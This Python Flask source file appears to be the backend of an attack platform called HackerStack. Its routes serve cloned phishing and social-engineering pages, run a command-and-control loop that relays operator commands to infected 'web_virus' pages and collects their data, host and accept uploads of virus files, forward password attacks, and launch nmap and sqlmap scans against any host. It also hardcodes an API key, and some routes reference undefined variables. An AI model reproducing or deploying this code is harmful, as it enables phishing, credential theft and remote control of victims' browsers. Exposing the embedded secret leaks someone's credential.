
import os
from flask import Flask,request , Response, send_file
from flask_cors import CORS
import requests
import hashlib
import random
import string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import asyncio
import mimetypes
import threading
import time
from urllib.parse import unquote
import qrcode
import json
import whois
import markdown
from zhipuai import ZhipuAI
from flask_sse import sse



import NmapScaner as NmapScaner
import config_loader as config_loader
import SqlMapScaner as SqlMapScaner
import dns_searcher as dns_searcher



app = Flask(__name__)
CORS(app)

user_server = 'http://user.hackerstack.top'
url_list = {}
config: config_loader = None
visit_request = {}
ip_proxy = {}
client = ZhipuAI(api_key="b8487357fcb60284daa628fd8746d8b1.0wahvm5rmBqfFJzq") # 请填写您自己的APIKey




class user_sessen():
    username: str = ''
    url: str = ''
    attack_type: str = ''
    message ='none'
    url_clone: str = ''
    attack_command: str = ''

def get_random() -> str:
    # 定义可用的字符集，包括26个英文字母（大小写）和数字
    characters = string.ascii_letters + string.digits
    # 生成一个10个字符长度的随机字符串
    random_string = ''.join(random.choice(characters) for _ in range(10))
    if random_string in url_list.keys():
        return get_random()
    else:
        return random_string

@app.route('/ai_chat/<path:message>')
def ai_chat(message):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 2:
            return 'Too many requests, Max: 10'
    else:
        visit_request[client_ip] = 1
    response = client.chat.completions.create(
    model="glm-4",  # 填写需要调用的模型名称
    messages=[
        {"role": "user", "content": message},
    ],)
    return markdown.markdown(str(response.choices[0].message.content))

@app.route('/get_ip_location/<ip>' , methods=['POST' , 'GET'])
def get_ip_location(ip):
    r = requests.get('http://ip-api.com/json/'+ip)
    return r.text

@app.route('/dns_search/<path:website>')
def dns_search(website):
    return dns_searcher.get_dns(website)

@app.route('/sqlmap/<check>/<path:host>')
def sqlmap_scan(check , host):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 2:
            return 'Too many requests, Max: 2'
    else:
        visit_request[client_ip] = 1

    r = requests.post(user_server+'/check_ip_check/'+check)
    if json.loads(r.text)['message'] == 'ok':
        return SqlMapScaner.CommandSqlMap(host=host)
    else:
        return 'check code error.'

@app.route('/nmap/<check_code>/<path:host>')
def nmap_scan(check_code , host):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 2:
            return 'Too many requests, Max: 2'
    else:
        visit_request[client_ip] = 1
    
    try:
        if host == '127.0.0.1' or host == '0.0.0.0':
            return 'NULL'
        r = requests.post(user_server+'/check_ip_check/'+check_code)
        if json.loads(r.text)['message'] == 'ok':
            return NmapScaner.CommandNmap(host)
        else:
            return 'check code error.'
    except:
        return 'Nmap Error'

@app.route('/whois/<path:website>')
def whois_show(website):
    w = whois.whois(str(website))
    return w

@app.route('/pwd_attack' , methods=['POST'])
def pwd_attack():
        data = request.get_data().decode('utf-8').split('\n')
        url = data[0]
        check = data[1]
        body = ''

        for i in range(2, len(data)):
            body += data[i] +'\n'
        body = body.strip()
        r = requests.post(user_server+'/check_ip_check/'+check)
        if json.loads(r.text)['message'] == 'ok':
            attack_requests = requests.post(user_server+'/attack_hasjdfjiqu489uodsfhjoasjr9w4ruiosidfjsdlo',data=url+'\n'+body)
            return attack_requests.text
        else:
            return 'check code error.'
        
@app.route('/create_web_virus/<user>/<pwd>' , methods=['GET'])
def create_web_virus(user , pwd):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = 'web_virus'
        u.username = user
        u.url_clone = attack_url

        url_list[n] = u
        return n

    else:
        return 'your message error' 

@app.route('/qr_code' , methods=['POST'])
def make_qr_code():
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 9:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1
        
    data = request.get_data().decode('utf-8').strip()
    img_file = r'qrcode/'+ get_random()+".png"
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=10,
        border=4
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image()
    img.save(img_file)
    img.show()
    file_name = img_file
    return send_file(file_name, as_attachment=True)

@app.route('/get_virus/<file_name>')
def get_virus(file_name):
    return send_file("../virus/"+file_name, as_attachment=True)

@app.route('/virus_clear_command/<path:attack_url>' , methods=['GET','POST'])
def clear_token_command(attack_url):
    if attack_url in url_list.keys():
        if url_list.get(attack_url).attack_type == 'web_virus':
            url_list.get(attack_url).attack_command = "none"
            return 'ok'
        else:
            return 'your message error'

    else:
        return 'your message error'

@app.route('/push/<attack_url>/<path:message>' , methods=['POST' , 'GET'])
def get_message(attack_url,message):

    if attack_url in url_list.keys():
        if url_list.get(attack_url).attack_type == 'web_virus':
            print("1190234932-0: "+url_list.get(attack_url).attack_command)
            url_list.get(attack_url).message = unquote(message)
            send_command = url_list.get(attack_url).attack_command
            # url_list.get(attack_url).attack_command = 'none'
            return send_command

        url_list.get(attack_url).message = unquote(message)
        return 'ok'

    else:
        return 'your message error'
    
@app.route('/push_bin/<attack_url>' , methods=['POST' , 'GET'])
def push_bin(attack_url):
    data = request.get_data()

    if attack_url in url_list.keys():
        if url_list.get(attack_url).attack_type == 'web_virus':
            print("11: "+url_list.get(attack_url).attack_command)
            url_list.get(attack_url).message = data
            return url_list.get(attack_url).attack_command

        url_list.get(attack_url).message = data
        return 'ok'

    else:
        return 'your message error'

@app.route('/get_virus_list')
def get_virus_list():
    list_file = os.listdir('virus/')
    content = ''
    for i in list_file:
        if os.path.isdir('virus/'+i) == True:
            continue
        content += i + '\n'

    return content

@app.route('/update_virus/<filename>/<check>' , methods=['POST'])
def update_virus(filename , check):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1
    message = str(json.loads(requests.get(user_server+'/check_ip_check/' + check).text.strip())['message'])
    print(message)
    if str(filename).strip().lower() == "index.html" or str(filename).strip().lower() == "index.htm":
        return 'FILE NAME IS NULL: index.html or index.htm'
    if message.strip() != 'ok':
        return 'Check code error.'

    current_time = time.time()  # 获取当前时间戳
    local_time = time.localtime(current_time)  # 将时间戳转换为本地时间
    formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", local_time)  # 格式化时间

    data = request.get_data()
    if len(data) > 1024 * 1024 * 10:
        return 'MAX UPDATE: 10MB.'

    with open('virus/' + formatted_time+"-"+filename , "wb") as f:
        f.write(data)
    return 'update ok.'

@app.route('/run/<attack_url>')
def xhr_run(attack_url):
    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        if u.attack_type == 'VideoVirus':
            message_to_return = u.message
        else:
            # 返回u.message的值
            message_to_return = u.message
            # 更新u.message为'none'
            u.message = 'none'
            # 返回之前存储的消息
        return message_to_return
    else:
        return 'none'
    
@app.route('/virus_run/<attack_url>/<path:command>')
def virus_run(attack_url , command):
    print(1)
    if attack_url in url_list.keys():
        print("ufdlkaslkfjdlkfjljflkdsjdf")
        u: user_sessen = url_list.get(attack_url)
        # 返回u.message的值
        message_to_return = u.message
        u.attack_command = command
        # 返回之前存储的消息
        return message_to_return
    else:
        return 'none'
    
@app.route('/resource/<path:url>') 
def get_resource(url):

    full_url = 'resource/' + str(url)
    r = Response()
    r.data = open(full_url , 'rb').read()
    (content_type, encoding) = mimetypes.guess_type(full_url)
    r.headers['Content-Type'] = content_type
    
    return r

@app.route('/w/<attack_token>/<path:url>')
def web_clone_url(attack_token,url):
    if attack_token in url_list.keys():
        u: user_sessen = url_list.get(attack_url)

        r = requests.get(u.url_clone+"/"+url)
        return r.content
    else:
        return 'send message error'

@app.route('/WebClone/<attack_url>/<user>/<pwd>')
def WebClone(attack_url , user , pwd):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    attack_url = str(attack_url).replace('-' , '/')

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = 'webclone'
        u.username = user
        u.url_clone = attack_url

        url_list[n] = u
        return n

    else:
        return 'your message error' 


@app.route('/api/<attack_type>/<user>/<pwd>/')
def attack(attack_type,user,pwd):

    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text.lower() != 'login failed.':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = attack_type
        u.username = user

        url_list[n] = u
        print(attack_type)
        return n

    else:
        return 'your message error'

@app.route('/<path:attack_url>')
def attack_url(attack_url):

    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        r = Response()
        try:
            if u.attack_type == 'web_virus':
                r.data = open('modules/web_virus/index.html').read()
            elif u.attack_type == 'VideoVirus':
                r.data = open('modules/VideoVirus/index.html').read()
            elif u.attack_type == 'VirusInfoGetter':
                r.data = open('modules/VirusInfoGetter/index.html').read()
            else:
                # print('modules/socialEngine/'+u.attack_type+"/index.html")
                # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
                r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
            return r
        except:
            return 'the server error'
                
    else:
        print(attack_url)
        print(url_list)
        return 'your message error'

def visit_request_threading() -> None:
    while True:
        time.sleep(60) # 休息 60 秒
        visit_request.clear()

if __name__ == '__main__':
    config = config_loader.HackerStack_Config()

    visit_request_thread = threading.Thread(target=visit_request_threading , name='visit_request')
    visit_request_thread.start()

    app.run(host='0.0.0.0',port=int(config.get(
        'server_port'
    )))